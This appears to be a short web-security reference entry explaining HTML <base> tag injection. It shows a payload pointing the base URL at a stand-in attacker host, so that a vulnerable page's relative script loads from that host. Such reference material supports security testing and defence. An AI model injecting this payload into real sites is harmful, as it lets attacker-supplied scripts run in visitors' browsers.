The HTML [&lt;base&gt;](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/base) element specifies the base URL to use for all relative URLs in a document.

> Note: If multiple &lt;base&gt; elements are used, only the first href and first target are obeyed — all others are ignored.

# Relative URL redirection

&lt;base&gt; tag injection allows you to redirect relative url to the attacker host. For example, if the vulnerable site includes a script:

```html
<script src="/assets/some-script.js"></script>
```

so, if you inject before the relative remote script:

```html
<base href="https://attacker-website.com">
``` 

the browser will request `https://attacker-website.com/assets/some-script.js`.